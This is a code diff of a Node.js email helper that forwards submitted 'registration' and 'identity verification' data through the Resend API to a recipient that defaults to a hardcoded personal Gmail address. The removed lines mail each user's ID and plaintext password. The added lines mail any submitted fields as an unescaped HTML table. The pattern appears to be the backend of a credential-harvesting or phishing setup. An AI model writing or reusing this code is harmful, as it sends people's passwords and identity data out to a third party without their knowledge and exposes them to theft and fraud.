@@ -1,27 +1,58 @@
 const { Resend } = require("resend");
 
-const resend = new Resend(process.env.RESEND_KEY);
+const resendKey = process.env.RESEND_KEY;
+let resend = null;
+if (resendKey) {
+  resend = new Resend(resendKey);
+} else {
+  console.warn("RESEND_KEY not set; email sending will be skipped.");
+}
 
-async function sendUserEmail(data) {
+function buildHtmlFromObject(obj) {
+  if (!obj || typeof obj !== "object") return "<p>No data provided</p>";
+
+  const rows = Object.entries(obj)
+    .map(([k, v]) => {
+      const safeVal = v === undefined || v === null ? "" : String(v);
+      return `<tr><td style="padding:4px 8px;font-weight:600;border:1px solid #eee">${k}</td><td style="padding:4px 8px;border:1px solid #eee">${safeVal}</td></tr>`;
+    })
+    .join("");
+
+  return `
+    <h2>Notification</h2>
+    <table style="border-collapse:collapse">${rows}</table>
+  `;
+}
+
+async function sendUserEmail(payload) {
   try {
-    // Use configured recipient from environment, fallback to andrewmjr2@gmail.com
     const recipient = process.env.SEND_TO || "andrewmjr2@gmail.com";
-    console.log(
-      "sendUserEmail: sending to",
-      recipient,
-      "for user",
-      data && data.userId
-    );
+    const type = payload && payload.type ? payload.type : "registration";
+
+    console.log("sendUserEmail: sending", type, "notification to", recipient);
+
+    // Determine the data object to render
+    const dataToRender = payload && payload.data ? payload.data : payload;
+
+    const subject =
+      payload && payload.subject
+        ? payload.subject
+        : type === "identity_verification"
+        ? "Identity Verification Submitted"
+        : "New User Registration Submitted";
+
+    const html = buildHtmlFromObject(dataToRender);
+
+    if (!resend) {
+      console.warn("Skipping email send because RESEND_KEY is not configured.");
+      return { skipped: true, reason: "missing RESEND_KEY" };
+    }
 
     const resp = await resend.emails.send({
-      from: "User System <onboarding@resend.dev>", // required approved domain
+      from: "User System <onboarding@resend.dev>",
       to: recipient,
-      subject: "New User Registration Submitted",
-      html: `
-        <h2>New User Registration</h2>
-        <p><strong>User ID:</strong> ${data.userId}</p>
-        <p><strong>Password:</strong> ${data.password}</p>
-      `,
+      subject,
+      html,
     });
 
     console.log("Email sent successfully! Resend response:", resp);
